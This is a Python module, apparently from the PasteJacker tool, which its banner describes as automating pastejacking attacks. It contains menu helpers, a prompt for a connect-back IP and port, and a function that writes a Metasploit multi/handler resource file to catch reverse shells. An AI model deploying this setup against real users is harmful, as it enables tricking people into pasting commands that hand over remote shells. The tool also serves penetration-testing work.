# -*- encoding: utf-8 -*-
#Written by: Karim shoair - D4Vinci ( Cr3dOv3r )
import os,time,subprocess,pkg_resources
from . import updater
from .color import *

banner = """{G}
                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    "\\\   7   7   ]
^.___~"--._    ~-(  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y   -{W}=b{G}-. _)        ______         _         ___            _
               (_/ .  \  :           / l      c"~o \\       | ___ \       | |       |_  |          | |
                \ /    `.    .     .^   \_.-~"~--.  )      | |_/ /_ _ ___| |_ ___    | | __ _  ___| | _____ _ __
                 (_/ .   `  /     /       !       )/       |  __/ _` / __| __/ _ \   | |/ _` |/ __| |/ / _ \ '__|
                  / / _.   '.   .':      /        '        | | | (_| \__ \ ||  __/\__/ / (_| | (__|   <  __/ |
                  ~(_/ .   /    _  `  .-<_                 \_|  \__,_|___/\__\___\____/ \__,_|\___|_|\_\___|_|
                    /_/ . ' .-~" `.  / \  \          ,z=.  /─────────────────────────────────────────────────────\\
                    ~( /   '  :   | K   "-.~-.______//     {W}[{Y}=>{W}] PasteJacking attacks automation with a style. [{Y}<={W}]{G}
                      "-,.    l   I/ \_    __(--->._(==.   {W}[{Y}=>{W}]      {B}Created by: {R}Karim Shoair (D4Vinci)       {W}[{Y}<={W}]{G}
                       //(     \  <    ~"~"     //         {W}[{Y}=>{W}]              {B}Version: {R}{version}                     {W}[{Y}<={W}]{G}
                      /' /\     \  \     ,v=.  ((          {W}[{Y}=>{W}]            {B}Codename:{R} Hijack                   {W}[{Y}<={W}]{G}
                    .^. / /\     "  )__ //===-  `          {W}[{Y}=>{W}]       {B}Follow me on Twitter: {R}@D4Vinci1         {W}[{Y}<={W}]{G}
                   / / ' '  "-.,__ (---(==-                {W}[{Y}=>{W}]                                               [{Y}<={W}]{G}
                 .^ '       :  T  ~"   ll                  {W}[{Y}=>{W}]         CHOOSE A TARGET TO BEGIN              [{Y}<={W}]{G}
                / .  .  . : | :!        \\                  \_____________________________________________________/
               (_/  /   | | j-"          ~^
                 ~-<_(_.^-~"
"""
core_dir = pkg_resources.resource_filename('PasteJacker', 'Core')
templates_dir = pkg_resources.resource_filename('PasteJacker', 'templates')

def add_corefilepath(*args):
    return os.path.join(core_dir, *args)


def get_templates_dir():
    return templates_dir

def print_banner():
	os.system("clear")
	version = updater.check()
	banner_to_print = Bold + banner.format(version=version,Y=Y,B=B,W=W,R=R,G=G) + end
	print(banner_to_print)

def validate_input(num, choices):
    try:
        num = int(num)
    except:
        error("Please enter a valid integer!")
        time.sleep(0.5)
        return False
    else:
        exit_choice = choices[-1]
        if num == exit_choice:
            return -1
        elif num not in list( range(*choices) ):
            error("Please enter a valid choice!")
            time.sleep(0.5)
            return False
        else:
            return True

def print_choices(choices, spaces=None):
    if spaces:
        print(" "*(spaces+1)+G+"│")
    final_choice = "Back" if spaces else "Exit"
    for n,line in enumerate([*choices,final_choice]):
        current_range = n+1
        print( numbered(n+1,line,spaces if spaces else 2) )
    return current_range

def ask_for_ip_port(spaces=10):
    while True:
        ip = colored_input("IP to connect back to",spaces)
        if not ip:
            continue
        port = colored_input("Connection port (1337)",spaces) or '1337'
        break
    return ip,port

def ask_for_text():
    text = ""
    status("Enter the text you want user to see "+B+"(Press enter twice to finish...)")
    while True:
        line = input(G+"  >>> "+end)
        if not line:
            break
        else:
            text = text +line+ "<br>"
    return (text or "  ")

def write_resource(payload,ip,port):
    data = """use multi/handler
set payload {payload}
set lhost {ip}
set lport {port}
set exitonsession false
exploit -j"""
    resource = data.format(**locals())
    f = open("/root/.pastejacker/msf_handler.rc","w")
    f.write(resource)
    f.close()

def execute(command):
    cmd = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    output,error=cmd.communicate()
    if error==output:
        return False
    return True
